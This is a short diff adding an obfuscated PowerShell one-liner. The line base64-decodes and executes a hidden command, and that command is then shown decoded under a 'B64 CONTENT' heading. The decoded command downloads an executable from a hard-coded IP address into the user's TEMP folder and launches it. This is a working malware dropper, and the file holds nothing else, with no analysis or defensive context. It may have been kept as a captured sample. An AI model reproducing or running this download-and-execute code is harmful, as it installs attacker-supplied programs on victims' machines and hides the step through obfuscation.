@@ -1,0 +1,7 @@
+iex([SYstem.teXt.encodiNg]::utF8.gETsTrINg([SYsteM.cOnvert]::fROMBaSE64StrINg('CihOZXctT2JqZWN0IHN5U3RlbS5uRXQuV0VCQ0xpZW50KS5kb3dObE9hREZpTEUoJ2h0dHA6Ly8xODUuMTA2LjEyMi42Mi9maWxlLmV4ZScsIiRFbnY6VEVNUFxmaWxleDg2LmV4ZSIpO1N0YXJ0LVByb2Nlc3MgKCIkRW52OlRFTVBcZmlsZXg4Ni5leGUiKQoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object syStem.nEt.WEBCLient).dowNlOaDFiLE('http://185.106.122.62/file.exe',"$Env:TEMP\filex86.exe");Start-Process ("$Env:TEMP\filex86.exe")
+
